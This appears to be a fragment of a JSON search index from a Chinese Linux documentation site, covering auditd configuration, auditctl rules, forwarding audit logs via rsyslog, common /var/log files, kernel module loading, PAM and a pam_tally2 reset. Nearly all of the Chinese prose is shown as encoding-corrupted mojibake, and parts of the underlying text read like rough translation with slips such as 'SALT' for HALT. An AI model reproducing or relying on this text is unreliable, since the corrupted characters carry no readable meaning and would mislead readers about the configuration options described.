æ­¤é€‰é¡¹æ§åˆ¶è®¡ç®—æœºèŠ‚ç‚¹åå¦‚ä½•æ’å…¥åˆ°å®¡è®¡äº‹ä»¶æµä¸­ã€‚å®ƒæœ‰å¦‚ä¸‹çš„é€‰æ‹©ï¼šnone, hostname, fqd, numeric, and user # Noneæ„å‘³ç€æ²¡æœ‰è®¡ç®—æœºåè¢«æ’å…¥åˆ°å®¡è®¡äº‹ä»¶ä¸­ã€‚hostnameé€šè¿‡gethostnameç³»ç»Ÿè°ƒç”¨è¿”å›çš„åç§°ã€‚fqdæ„å‘³ç€å®ƒ=ä»¥ä¸»æœºå # å’Œè§£å†³å®ƒä¸DNSçš„å®Œå…¨åˆæ ¼çš„åŸŸåï¼Œnumericç±»ä¼¼äºfqdé™¤è§£å†³æœ¬æœºçš„IPåœ°å€ï¼Œä¸ºäº†ä½¿ç”¨è¿™ä¸ªé€‰é¡¹ï¼Œä½ å¯èƒ½æƒ³è¦æµ‹è¯•'hostname -i' # æˆ– 'domainname-i'è¿”å›ä¸€ä¸ªæ•°å­—åœ°å€,å¦å¤–ï¼Œæ­¤é€‰é¡¹ä¸å¦‚æœDHCPçš„ä½¿ç”¨æ˜¯å› ä¸ºä½ å¯ä»¥æœ‰ä¸åŒçš„åœ°å€ï¼Œåœ¨åŒä¸€å°æœºå™¨ä¸Šçš„æ—¶é—´æ¨èã€‚ # ç”¨æˆ·æ˜¯ä»åç§°é€‰é¡¹ä¸­å®šä¹‰çš„å­—ç¬¦ä¸²ã€‚é»˜è®¤å€¼æ˜¯æ²¡æœ‰ name_format = NONE ##name = mydomain # ä»¥å…†å­—èŠ‚è¡¨ç¤ºçš„æœ€å¤§æ—¥å¿—æ–‡ä»¶å®¹é‡ã€‚å½“è¾¾åˆ°è¿™ä¸ªå®¹é‡æ—¶ï¼Œä¼šæ‰§è¡Œmax_log_file _actionæŒ‡å®šçš„åŠ¨ä½œ max_log_file = 6 # å½“è¾¾åˆ°max_log_fileçš„æ—¥å¿—æ–‡ä»¶å¤§å°æ—¶é‡‡å–çš„åŠ¨ä½œã€‚å€¼å¿…é¡»æ˜¯IGNOREã€SYSLOGã€SUSPENDã€ROTATEå’ŒKEEP_LOGSä¹‹ ä¸€ã€‚ # å¦‚æœè®¾ç½®ä¸ºIGNOREï¼Œåˆ™åœ¨æ—¥å¿—æ–‡ä»¶è¾¾åˆ°max_log_fileåä¸é‡‡å–åŠ¨ä½œã€‚å¦‚æœè®¾ç½®ä¸ºSYSLOGï¼Œåˆ™å½“è¾¾åˆ°æ–‡ä»¶å®¹é‡æ—¶ä¼šå‘ # ç³»ç»Ÿæ—¥å¿—/var /log/messagesä¸­å†™å…¥ä¸€æ¡è­¦å‘Šã€‚å¦‚æœè®¾ç½®ä¸ºSUSPENDï¼Œåˆ™å½“è¾¾åˆ°æ–‡ä»¶å®¹é‡åä¸ä¼šå‘æ—¥å¿—æ–‡ä»¶å†™å…¥å®¡è®¡ # æ¶ˆæ¯ã€‚å¦‚æœè®¾ç½®ä¸ºROTATEï¼Œåˆ™å½“è¾¾ åˆ°æŒ‡å®šæ–‡ä»¶å®¹é‡åä¼šå¾ªç¯æ—¥å¿—æ–‡ä»¶ï¼Œä½†æ˜¯åªä¼šä¿å­˜ä¸€å®šæ•°ç›®çš„è€æ–‡ä»¶ï¼Œè¿™ä¸ªæ•°ç›® # ç”±num_logså‚æ•°æŒ‡å®šã€‚è€æ–‡ä»¶çš„æ–‡ä»¶åå°†ä¸ºaudit.log.Nï¼Œå…¶ä¸­ Næ˜¯ä¸€ä¸ªæ•°å­—ã€‚è¿™ä¸ªæ•°å­—è¶Šå¤§ï¼Œåˆ™æ–‡ä»¶è¶Šè€ã€‚å¦‚æœè®¾ # ç½®ä¸ºKEEP_LOGSï¼Œåˆ™ä¼šå¾ªç¯æ—¥å¿—æ–‡ä»¶ï¼Œä½†æ˜¯ä¼šå¿½ç•¥num_logså‚æ•°ï¼Œå› æ­¤ä¸ä¼šåˆ é™¤æ—¥å¿—æ–‡ä»¶ max_log_file_action = ROTATE # ä»¥å…†å­—èŠ‚è¡¨ç¤ºçš„ç£ç›˜ç©ºé—´æ•°é‡ã€‚å½“è¾¾åˆ°è¿™ä¸ªæ°´å¹³æ—¶ï¼Œä¼šé‡‡å–space_left_actionå‚æ•°ä¸­çš„åŠ¨ä½œ space_left = 75 # å½“ç£ç›˜ç©ºé—´é‡è¾¾åˆ°space_leftä¸­çš„å€¼æ—¶ï¼Œé‡‡å–è¿™ä¸ªåŠ¨ä½œã€‚æœ‰æ•ˆå€¼ä¸ºIGNOREã€SYSLOGã€EMAILã€SUSPENDã€SINGLEå’Œ HALTã€‚ # å¦‚æœè®¾ç½®ä¸ºIGNOREï¼Œåˆ™ä¸é‡‡å–åŠ¨ä½œã€‚å¦‚æœè®¾ç½®ä¸ºSYSLOGï¼Œåˆ™å‘ç³»ç»Ÿæ—¥å¿—/var/log/messageså†™ä¸€æ¡è­¦å‘Šæ¶ˆæ¯ã€‚å¦‚æœè®¾ç½®ä¸º # EMAILï¼Œåˆ™ä»action_mail_acctå‘è¿™ä¸ªåœ°å€å‘é€ä¸€å°ç”µå­é‚®ä»¶ï¼Œå¹¶å‘/var/log/messagesä¸­å†™ä¸€æ¡è­¦å‘Šæ¶ˆæ¯ã€‚å¦‚æœè®¾ç½®ä¸º # SUSPENDï¼Œåˆ™ä¸å†å‘å®¡è®¡æ—¥å¿—æ–‡ä»¶ä¸­å†™è­¦å‘Šæ¶ˆæ¯ã€‚å¦‚æœè®¾ç½®ä¸ºSINGLEï¼Œåˆ™ç³»ç»Ÿå°†åœ¨å•ç”¨æˆ·æ¨¡å¼ä¸‹ã€‚å¦‚æœè®¾ç½®ä¸ºSALTï¼Œåˆ™ç³»ç»Ÿä¼šå…³é—­ã€‚ space_left_action = SYSLOG # è´Ÿè´£ç»´æŠ¤å®¡è®¡å®ˆæŠ¤è¿›ç¨‹å’Œæ—¥å¿—çš„ç®¡ç†å‘˜çš„ç”µå­é‚®ä»¶åœ°å€ã€‚å¦‚æœåœ°å€æ²¡æœ‰ä¸»æœºåï¼Œåˆ™å‡å®šä¸»æœºåä¸ºæœ¬åœ°åœ°å€ï¼Œæ¯”å¦‚rootã€‚ # å¿…é¡»å®‰è£…sendmailå¹¶é…ç½®ä¸ºå‘æŒ‡å®šç”µå­é‚®ä»¶åœ°å€å‘é€ç”µå­é‚®ä»¶ã€‚ action_mail_acct = root # ä»¥å…†å­—èŠ‚è¡¨ç¤ºçš„ç£ç›˜ç©ºé—´æ•°é‡ã€‚ç”¨è¿™ä¸ªé€‰é¡¹è®¾ç½®æ¯”space_left_actionæ›´å¤šçš„ä¸»åŠ¨æ€§åŠ¨ä½œï¼Œä»¥é˜²ä¸‡ä¸€space_left_actionæ²¡æœ‰è®© # ç®¡ç†å‘˜é‡Šæ”¾ä»»ä½•ç£ç›˜ç©ºé—´ã€‚è¿™ä¸ªå€¼åº”å°äºspace_left_actionã€‚å¦‚æœè¾¾åˆ°è¿™ä¸ªæ°´å¹³ï¼Œåˆ™ä¼šé‡‡å–admin_space_left_ actionæ‰€æŒ‡å®šçš„åŠ¨ä½œã€‚ admin_space_left = 50 # å½“è‡ªç”±ç£ç›˜ç©ºé—´é‡è¾¾åˆ°admin_space_leftæŒ‡å®šçš„å€¼æ—¶ï¼Œåˆ™é‡‡å–åŠ¨ä½œã€‚æœ‰æ•ˆå€¼ä¸ºIGNOREã€SYSLOGã€EMAILã€SUSPENDã€SINGLEå’ŒHALTã€‚ # ä¸è¿™äº›å€¼å…³è”çš„åŠ¨ä½œä¸space_left_actionä¸­çš„ç›¸åŒã€‚ admin_space_left_action = SUSPEND # å¦‚æœå«æœ‰è¿™ä¸ªå®¡è®¡æ–‡ä»¶çš„åˆ†åŒºå·²æ»¡ï¼Œåˆ™é‡‡å–è¿™ä¸ªåŠ¨ä½œã€‚å¯èƒ½å€¼ä¸ºIGNOREã€SYSLOGã€SUSPENDã€SINGLEå’ŒHALTã€‚ä¸è¿™äº›å€¼å…³è”çš„åŠ¨ä½œ # ä¸space_left_actionä¸­çš„ç›¸åŒã€‚ disk_full_action = SUSPEND # å¦‚æœåœ¨å†™å®¡è®¡æ—¥å¿—æˆ–å¾ªç¯æ—¥å¿—æ–‡ä»¶æ—¶æ£€æµ‹åˆ°é”™è¯¯æ—¶é‡‡å–çš„åŠ¨ä½œã€‚å€¼å¿…é¡»æ˜¯IGNOREã€SYSLOGã€SUSPENDã€SINGLEå’ŒHALTä¹‹ä¸€ã€‚ # ä¸è¿™äº›å€¼å…³çš„åŠ¨ä½œä¸space_left_actionä¸­çš„ç›¸åŒ disk_error_action = SUSPEND # è¿™æ˜¯åœ¨èŒƒå›´1ã€65535ï¼Œä¸€ä¸ªæ•°å­—å€¼ï¼Œå¦‚æœæŒ‡å®šï¼ŒåŸå› auditdå¬åœ¨ä»è¿œç¨‹ç³»ç»Ÿå®¡è®¡è®°å½•ç›¸åº”çš„TCPç«¯å£ã€‚å®¡è®¡ç¨‹åºå¯èƒ½ä¸tcp_wrappersã€‚ # ä½ å¯èƒ½æƒ³æ§åˆ¶åœ¨hosts.allowå…¥å£è®¿é—®å’Œå¦è®¤æ–‡ä»¶ã€‚ tcp_listen_port = # è¿™æ˜¯ä¸€ä¸ªæ•°å­—å€¼ï¼Œè¿™è¡¨æ˜æœ‰å¤šå°‘ç­‰å¾…ï¼ˆè¦æ±‚ä½†UNACæ¥å—ï¼‰çš„è¿æ¥æ˜¯å…è®¸çš„ã€‚é»˜è®¤å€¼æ˜¯5ã€‚è®¾ç½®è¿‡å°çš„å¯èƒ½å¯¼è‡´è¿æ¥è¢«æ‹’ç»ï¼Œ # å¦‚æœå¤ªå¤šä¸»æœºå¼€å§‹åœ¨å®Œå…¨ç›¸åŒçš„æ—¶é—´ï¼Œå¦‚ç”µæºæ•…éšœåã€‚ tcp_listen_queue = 5 # è¿™æ˜¯ä¸€ä¸ªæ•°å­—å€¼ï¼Œè¯¥å€¼è¡¨ç¤ºä¸€ä¸ªåœ°å€å…è®¸æœ‰å¤šå°‘ä¸ªå¹¶å‘è¿æ¥ã€‚é»˜è®¤ä¸º1ï¼Œæœ€å¤§ä¸º1024ã€‚è®¾ç½®è¿‡å¤§å¯èƒ½ä¼šå…è®¸æ‹’ç»æœåŠ¡æ”»å‡»çš„æ—¥å¿—æœåŠ¡å™¨ã€‚ # è¿˜è¦æ³¨æ„çš„æ˜¯ï¼Œå†…æ ¸å†…éƒ¨æœ‰ä¸€ä¸ªæœ€å¤§çš„ï¼Œæœ€ç»ˆå°†é˜²æ­¢è¿™ç§å³ä½¿auditdå…è®¸å®ƒé€šè¿‡é…ç½®ã€‚åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œé»˜è®¤åº”è¯¥æ˜¯è¶³å¤Ÿé™¤éå†™ä¸€ä¸ª # è‡ªå®šä¹‰çš„æ¢å¤è„šæœ¬è¿è¡Œæå‡ºæœªå‘é€äº‹ä»¶ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨å°†å¢åŠ çš„æ•°é‡åªæœ‰è¶³å¤Ÿå¤§ï¼Œè®©å®ƒåœ¨è¿‡ã€‚ tcp_max_per_addr = 1 ##tcp_client_ports = 1024-65535 tcp_client_max_idle = 0 # å¦‚æœè®¾ç½®ä¸º\"yes\"ï¼ŒKerberos 5å°†ç”¨äºè®¤è¯å’ŒåŠ å¯†ã€‚é»˜è®¤æ˜¯\"no\"ã€‚ enable_krb5 = no # è¿™æ˜¯è¿™ä¸ªæœåŠ¡å™¨çš„ä¸»è¦ã€‚é»˜è®¤æ˜¯\"auditd\"ã€‚é‰´äºè¿™ç§é»˜è®¤æƒ…å†µä¸‹ï¼ŒæœåŠ¡å™¨ä¼šå¯»æ‰¾ä¸€ä¸ªåä¸ºauditd/hostname@EXAMPLE.COMå­˜å‚¨åœ¨/etc/audit/audit.key # è®¤è¯æœ¬èº«å…¶ä¸­ä¸»æœºæ˜¯æœåŠ¡å™¨çš„ä¸»æœºåç§°ï¼Œå¦‚DNSæŸ¥æ‰¾å…¶IPåœ°å€è¿”å›ã€‚ krb5_principal = auditd # è¿™ä¸ªå®¢æˆ·çš„ä¸»è¦è´Ÿè´£äººçš„ä½ç½®ã€‚è¯·æ³¨æ„ï¼Œå¯†é’¥æ–‡ä»¶å¿…é¡»ç”±æ ¹å’Œæ¨¡å¼0400æ‰€æ‹¥æœ‰ã€‚é»˜è®¤çš„æ˜¯/etc/audit/audit.key krb5_key_file = /etc/audit/audit.key auditdçš„ä½¿ç”¨ å®‰è£…auditdæœåŠ¡: # CentOS7ç³»ç»Ÿé»˜è®¤å®‰è£…äº†auditæœåŠ¡ rpm -aq | grep audit rpm -ql audit é…ç½®audit.rulesè§„åˆ™ é»˜è®¤æƒ…å†µä¸‹å®¡è®¡è§„åˆ™æ˜¯ç©ºçš„ æŸ¥çœ‹è§„åˆ™: auditctl -l æŸ¥çœ‹å‘½ä»¤å¸®åŠ©: auditctl -h ä¾‹å¦‚æ·»åŠ ä¸€æ¡è§„åˆ™: auditctl -w /data -p rwxa /*ç›‘æ§/dataç›®å½• -w path : æŒ‡å®šè¦ç›‘æ§çš„è·¯å¾„ -p : æŒ‡å®šè§¦å‘å®¡è®¡çš„æ–‡ä»¶/ç›®å½•çš„è®¿é—®æƒé™ rwxa ï¼š æŒ‡å®šçš„è§¦å‘æ¡ä»¶ï¼Œr è¯»å–æƒé™ï¼Œw å†™å…¥æƒé™ï¼Œx æ‰§è¡Œæƒé™ï¼Œa å±æ€§ï¼ˆattrï¼‰*/ æ°¸ä¹…ä¿å­˜å®¡è®¡è§„åˆ™ æŒ‡ä»¤: vi /etc/audit/rules.d/audit.rules ä¾‹å¦‚å°†-w /data/ -p rwxaåŠ å…¥åˆ°æœ€åä¸€è¡Œ service auditd restart auditctl -l å®¡è®¡æ•ˆæœ åœ¨/data/ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªæ–‡ä»¶æˆ–è€…ä¿®æ”¹æ–‡ä»¶ï¼ŒæŸ¥çœ‹å®¡è®¡æ—¥å¿—: tail -f /var/log/audit/audit.log å°†auditæ—¥å¿—é€šè¿‡rsyslogè½¬å‘ç»™æ—¥å¿—æœåŠ¡å™¨ auditæœ‰rsyslogæ’ä»¶èƒ½å®ç°è½¬å‘åˆ°æœ¬åœ°çš„rsyslogæœåŠ¡: cd /etc/audisp/plugins.d/ vi syslog.conf ä¿®æ”¹å¦‚ä¸‹ä¸¤é¡¹ active = yes args = LOG_LOCAL0 ç„¶åé‡å¯auditæœåŠ¡ service auditd restart auditå®¡è®¡æ—¥å¿—è¿˜ä¼šè¾“å‡ºåˆ°/var/log/messageæ–‡ä»¶ä¸­ å¦‚æœéœ€è¦ç¦æ­¢è¾“å‡ºåˆ°/var/log/messagesæ–‡ä»¶ï¼Œå¯ä»¥ä¿®æ”¹rsyslog.confé…ç½®é¡¹å¹¶é‡å¯rsyslogæœåŠ¡ åœ¨å¦‚ä¸‹ä½ç½®åŠ å…¥local0.noneæ¥å®ç°ä¸è¾“å‡ºåˆ°/var/log/messagesä¸­: vi /etc/rsyslog.conf *.info;mail.none;authpriv.none;cron.none;local0.none /var/log/messages æœ€åä¸€è¡Œæ·»åŠ æ—¥å¿—æœåŠ¡å™¨ *.* @192.168.31.51 ä¿å­˜é€€å‡º service rsyslog restart å®¡è®¡æ—¥å¿—åªè¾“å‡ºåˆ°æ—¥å¿—æœåŠ¡å™¨ï¼Œæœªæ‰“å°åˆ°/var/log/messagesä¸­ ç³»ç»Ÿæ—¥å¿— ä»¥ä¸‹ä»‹ç»çš„æ˜¯20ä¸ªä½äº/var/log/ ç›®å½•ä¹‹ä¸‹çš„æ—¥å¿—æ–‡ä»¶ã€‚ å…¶ä¸­ä¸€äº›åªæœ‰ç‰¹å®šç‰ˆæœ¬é‡‡ç”¨ï¼Œå¦‚dpkg.logåªèƒ½åœ¨åŸºäºDebiançš„ç³»ç»Ÿä¸­çœ‹åˆ°ã€‚ /var/log/messages åŒ…æ‹¬æ•´ä½“ç³»ç»Ÿä¿¡æ¯ï¼Œå…¶ä¸­ä¹ŸåŒ…å«ç³»ç»Ÿå¯åŠ¨æœŸé—´çš„æ—¥å¿—ã€‚ æ­¤å¤–ï¼Œmailï¼Œcronï¼Œdaemonï¼Œkernå’Œauthç­‰å†…å®¹ä¹Ÿè®°å½•åœ¨var/log/messagesæ—¥å¿—ä¸­ã€‚ var/log/dmesg åŒ…å«å†…æ ¸ç¼“å†²ä¿¡æ¯ï¼ˆkernel ring bufferï¼‰ã€‚åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶ï¼Œä¼šåœ¨å±å¹•ä¸Šæ˜¾ç¤ºè®¸å¤šä¸ç¡¬ä»¶æœ‰å…³çš„ä¿¡æ¯ã€‚å¯ä»¥ç”¨dmesgæŸ¥çœ‹å®ƒä»¬ã€‚ /var/log/auth.log åŒ…å«ç³»ç»Ÿæˆæƒä¿¡æ¯ï¼ŒåŒ…æ‹¬ç”¨æˆ·ç™»å½•å’Œä½¿ç”¨çš„æƒé™æœºåˆ¶ç­‰ã€‚ /var/log/boot.log åŒ…å«ç³»ç»Ÿå¯åŠ¨æ—¶çš„æ—¥å¿—ã€‚ /var/log/daemon.log åŒ…å«å„ç§ç³»ç»Ÿåå°å®ˆæŠ¤è¿›ç¨‹æ—¥å¿—ä¿¡æ¯ã€‚ /var/log/dpkg.log åŒ…æ‹¬å®‰è£…æˆ–dpkgå‘½ä»¤æ¸…é™¤è½¯ä»¶åŒ…çš„æ—¥å¿—ã€‚ /var/log/kern.log åŒ…å«å†…æ ¸äº§ç”Ÿçš„æ—¥å¿—ï¼Œæœ‰åŠ©äºåœ¨å®šåˆ¶å†…æ ¸æ—¶è§£å†³é—®é¢˜ã€‚ /var/log/lastlog è®°å½•æ‰€æœ‰ç”¨æˆ·çš„æœ€è¿‘ä¿¡æ¯ã€‚è¿™ä¸æ˜¯ä¸€ä¸ªASCIIæ–‡ä»¶ï¼Œå› æ­¤éœ€è¦ç”¨lastlogå‘½ä»¤æŸ¥çœ‹å†…å®¹ã€‚ /var/log/maillog /var/log/mail.log åŒ…å«æ¥ç€ç³»ç»Ÿè¿è¡Œç”µå­é‚®ä»¶æœåŠ¡å™¨çš„æ—¥å¿—ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼Œsendmailæ—¥å¿—ä¿¡æ¯å°±å…¨éƒ¨é€åˆ°è¿™ä¸ªæ–‡ä»¶ä¸­ã€‚ /var/log/user.log è®°å½•æ‰€æœ‰ç­‰çº§ç”¨æˆ·ä¿¡æ¯çš„æ—¥å¿—ã€‚ /var/log/Xorg.x.log æ¥è‡ªXçš„æ—¥å¿—ä¿¡æ¯ã€‚ /var/log/alternatives.log æ›´æ–°æ›¿ä»£ä¿¡æ¯éƒ½è®°å½•åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­ã€‚ /var/log/btmp è®°å½•æ‰€æœ‰å¤±è´¥ç™»å½•ä¿¡æ¯ã€‚ä½¿ç”¨lastå‘½ä»¤å¯ä»¥æŸ¥çœ‹btmpæ–‡ä»¶ã€‚ä¾‹å¦‚ï¼Œ\"last -f /var/log/btmp | more\"ã€‚ /var/log/cups æ¶‰åŠæ‰€æœ‰æ‰“å°ä¿¡æ¯çš„æ—¥å¿—ã€‚ /var/log/anaconda.log åœ¨å®‰è£…Linuxæ—¶ï¼Œæ‰€æœ‰å®‰è£…ä¿¡æ¯éƒ½å‚¨å­˜åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­ã€‚ /var/log/yum.log åŒ…å«ä½¿ç”¨yumå®‰è£…çš„è½¯ä»¶åŒ…ä¿¡æ¯ã€‚ /var/log/cron æ¯å½“cronè¿›ç¨‹å¼€å§‹ä¸€ä¸ªå·¥ä½œæ—¶ï¼Œå°±ä¼šå°†ç›¸å…³ä¿¡æ¯è®°å½•åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­ã€‚ /var/log/secure åŒ…å«éªŒè¯å’Œæˆæƒæ–¹é¢ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼Œsshdä¼šå°†æ‰€æœ‰ä¿¡æ¯è®°å½•ï¼ˆå…¶ä¸­åŒ…æ‹¬å¤±è´¥ç™»å½•ï¼‰åœ¨è¿™é‡Œã€‚ /var/log/wtmpæˆ–/var/log/utmp åŒ…å«ç™»å½•ä¿¡æ¯ã€‚ä½¿ç”¨wtmpå¯ä»¥æ‰¾å‡ºè°æ­£åœ¨ç™»é™†è¿›å…¥ç³»ç»Ÿï¼Œè°ä½¿ç”¨å‘½ä»¤æ˜¾ç¤ºè¿™ä¸ªæ–‡ä»¶æˆ–ä¿¡æ¯ç­‰ã€‚ /var/log/faillog åŒ…å«ç”¨æˆ·ç™»å½•å¤±è´¥ä¿¡æ¯ã€‚æ­¤å¤–ï¼Œé”™è¯¯ç™»å½•å‘½ä»¤ä¹Ÿä¼šè®°å½•åœ¨æœ¬æ–‡ä»¶ä¸­ã€‚ é™¤äº†ä¸Šè¿°Logæ–‡ä»¶ä»¥å¤–ï¼Œ /var/logè¿˜åŸºäºç³»ç»Ÿçš„å…·ä½“åº”ç”¨åŒ…å«ä»¥ä¸‹ä¸€äº›å­ç›®å½•ï¼š /var/log/httpd/æˆ–/var/log/apache2 åŒ…å«æœåŠ¡å™¨access_logå’Œerror_logä¿¡æ¯ã€‚ /var/log/lighttpd/ åŒ…å«light HTTPDçš„access_logå’Œerror_logã€‚ /var/log/mail/ è¿™ä¸ªå­ç›®å½•åŒ…å«é‚®ä»¶æœåŠ¡å™¨çš„é¢å¤–æ—¥å¿—ã€‚ /var/log/prelink/ åŒ…å«.soæ–‡ä»¶è¢«prelinkä¿®æ”¹çš„ä¿¡æ¯ã€‚ /var/log/audit/ åŒ…å«è¢« Linux audit daemonå‚¨å­˜çš„ä¿¡æ¯ã€‚ /var/log/samba/ åŒ…å«ç”±sambaå­˜å‚¨çš„ä¿¡æ¯ã€‚ /var/log/sa/ åŒ…å«æ¯æ—¥ç”±sysstatè½¯ä»¶åŒ…æ”¶é›†çš„saræ–‡ä»¶ã€‚ /var/log/sssd/ ç”¨äºå®ˆæŠ¤è¿›ç¨‹å®‰å…¨æœåŠ¡ã€‚ é™¤äº†æ‰‹åŠ¨å­˜æ¡£å’Œæ¸…é™¤è¿™äº›æ—¥å¿—æ–‡ä»¶ä»¥å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨logrotateåœ¨æ–‡ä»¶è¾¾åˆ°ä¸€å®šå¤§å°åè‡ªåŠ¨åˆ é™¤ã€‚ å¯ä»¥å°è¯•ç”¨viï¼Œtailï¼Œgrepå’Œlessç­‰å‘½ä»¤æŸ¥çœ‹è¿™äº›æ—¥å¿—æ–‡ä»¶ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-system-service-Auditd.html","loc":"/yq-doc-source-docs-operating-system-linux-system-service-Auditd.html"},{"title":"å›½é™…åŒ–å’Œæœ¬åœ°åŒ–","text":"ç¨‹åºæ”¯æŒå›½é™…åŒ–çš„è¡Œä¸ºï¼Œæ˜¯é€šè¿‡é…ç½®ç¯å¢ƒå˜é‡ $LANG æ¥æ”¯æŒæœ¬åœ°åŒ–ã€‚ è¯­è¨€ç¯å¢ƒçš„å®é™…æ”¯æŒï¼Œä¾èµ– libc åº“æä¾›çš„ç‰¹æ€§ï¼Œ å¹¶è¦æ±‚å®‰è£… locales æˆ– locales-all è½¯ä»¶åŒ…ã€‚ locales è½¯ä»¶åŒ…éœ€è¦è¢«é€‚å½“çš„åˆå§‹åŒ–ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-system-service-Internationalization-and-localization.html","loc":"/yq-doc-source-docs-operating-system-linux-system-service-Internationalization-and-localization.html"},{"title":"å†…æ ¸æ¨¡å—","text":"insmod ä¸ modprobe éƒ½æ˜¯è½½å…¥ kernel moduleï¼Œ ä¸è¿‡ä¸€èˆ¬å·®åˆ«äº modprobe èƒ½å¤Ÿå¤„ç† module è½½å…¥çš„ç›¸ä¾é—®é¢˜ã€‚ æ¯”æ–¹ä½ è¦è½½å…¥ a moduleï¼Œä½†æ˜¯ a module è¦æ±‚ç³»ç»Ÿå…ˆè½½å…¥ b module æ—¶ï¼Œ ç›´æ¥ç”¨ insmod æŒ‚å…¥é€šå¸¸éƒ½ä¼šå‡ºç°é”™è¯¯è®¯æ¯ï¼Œ ä¸è¿‡ modprobe å€’æ˜¯èƒ½å¤ŸçŸ¥é“å…ˆè½½å…¥ b module åæ‰è½½å…¥ a moduleï¼Œå¦‚æ­¤ç›¸ä¾æ€§å°±ä¼šæ»¡è¶³ã€‚ ä¸è¿‡ modprobe å¹¶ä¸æ˜¯å¤§ç¥ï¼Œä¸ä¼šå‰å®³åˆ°çŸ¥é“ module ä¹‹é—´çš„ç›¸ä¾æ€§ä¸ºä½•ï¼Œ è¯¥ç¨‹å¼æ˜¯è¯»å– /lib/modules/2.6.xx/modules.dep æ¡£æ¡ˆå¾—çŸ¥ç›¸ä¾æ€§çš„ã€‚ è€Œè¯¥æ¡£æ¡ˆæ˜¯é€è¿‡ depmod ç¨‹å¼æ‰€å»ºç«‹ã€‚ ç›¸å…³æŒ‡ä»¤ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/lsmod /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/rmmod /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/insmod /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/modprobe","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-system-service-Kernel-module.html","loc":"/yq-doc-source-docs-operating-system-linux-system-service-Kernel-module.html"},{"title":"PAMæ¨¡å—","text":"PAMï¼ˆPluggable Authentication Modulesï¼Œ åµŒå…¥å¼æ¨¡å—ï¼‰ ä¸€å¥—åº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£ï¼Œæä¾›ä¸€è¿ä¸²çš„éªŒè¯æœºåˆ¶ï¼Œä½¿ç”¨è€…å°†éœ€æ±‚å‘ŠçŸ¥ï¼ŒPAMè¿”å›ä½¿ç”¨è€…éªŒè¯çš„ç»“æœ é…ç½®æ–‡ä»¶éƒ½åœ¨ /etc/pam.d ä¸‹é¢ å¦‚, passwdæ‰§è¡Œæµç¨‹ ç”¨æˆ·æ‰§è¡Œ passwdï¼Œè¾“å…¥å¯†ç ã€ passwd å‘¼å« PAMéªŒè¯æ¨¡å— PAM æ¨¡å—ä¼šæ‰¾åˆ° /etc/pam.d/ æ‰¾å¯»ä¸ç¨‹åºï¼ˆpasswdï¼‰ åŒåçš„é…ç½®æ–‡ä»¶ ä¾æ® /etc/pam.d/passwd å†…çš„è®¾å®šï¼Œå¼•ç”¨ç›¸å…³çš„PAMæ¨¡å—è¿›è¡ŒéªŒè¯åˆ†æ å°†éªŒè¯ç»“æœå›ä¼ ç»™passwd passwdæ ¹æ®è¿”å›ç»“æœå†³å®šä¸‹ä¸€ä¸ªåŠ¨ä½œï¼ˆéªŒè¯å¤±è´¥æˆ–è€…é€šè¿‡ï¼‰ é…ç½®æ–‡ä»¶ç»“æ„: # /etc/pam.d/passwd #%PAM-1.0 auth include system-auth æ¯ä¸€è¡Œå¯ä»¥åŒºåˆ†ä¸ºä¸‰ä¸ªå­—æ®µ type ä¸»è¦åˆ†å››ç§ auth authenticationçš„ç¼©å†™ï¼Œæ£€éªŒä½¿ç”¨è€…çš„èº«ä»½éªŒè¯ï¼Œé€šå¸¸æ˜¯éœ€è¦å¯†ç æ£€éªŒçš„ï¼Œæ‰€ä»¥åç»­æ¥çš„æ¨¡å—æ˜¯ç”¨æ¥æ£€éªŒç”¨æˆ·çš„èº«ä»½ã€‚ account å¤§éƒ¨åˆ†æ˜¯åœ¨è¿›è¡Œæˆæƒï¼ˆauthorizationï¼‰ï¼Œæ£€éªŒä½¿ç”¨è€…æ˜¯å¦å…·æœ‰æ­£ç¡®çš„æƒé™ï¼Œæ¯”å¦‚ï¼Œä½¿ç”¨ä¸€ä¸ªè¿‡æœŸçš„å¯†ç æ— æ³•ç™»é™† session ç®¡ç†ç™»é™†æœŸé—´ï¼ˆä¼šè¯ï¼‰ç¯å¢ƒ password å¯†ç ä¿®æ”¹ï¼Œå˜æ›´ flag éªŒè¯é€šè¿‡çš„æ ‡å‡† required æ­¤éªŒè¯è‹¥æˆåŠŸåˆ™å¸¦æœ‰successæ ‡è®°ï¼Œ è‹¥å¤±è´¥å¸¦æœ‰failureæ ‡è®° ä¸è®ºæ˜¯å¦æˆåŠŸéƒ½ä¼šè¿›è¡Œåç»­æµç¨‹ï¼ˆæœ‰åˆ©äºlogï¼‰ requisite å¦‚æœæ˜¯failureç«‹åˆ»è¿”å›ç»™æºç¨‹åºå¤±è´¥ï¼Œä¸ä¼šè¿›è¡Œåç»­æµç¨‹ sufficient ä¸ä¸Šä¸€ä¸ªç›¸å, æˆåŠŸåˆ™ç«‹åˆ»è¿”å›, å¤±è´¥åˆ™ç»§ç»­åç»­æ­¥éª¤ optional ç”¨äºæ˜¾ç¤ºå¾ªè®¯æ¯ PAM æ¨¡å—ä¸å‚æ•° å¾…è¡¥å……: | type | control flag | PAMæ¨¡å—ä¸æ¨¡å—å‚æ•° | | ---- | ------------ | ---------- | | | | | | | | | | | | | Linuxé‡ç½®root(user) sshé‡ç½®root(user)ç™»é™†å¤±è´¥è®¡æ•°å™¨: pam_tally2 --user=root --reset # 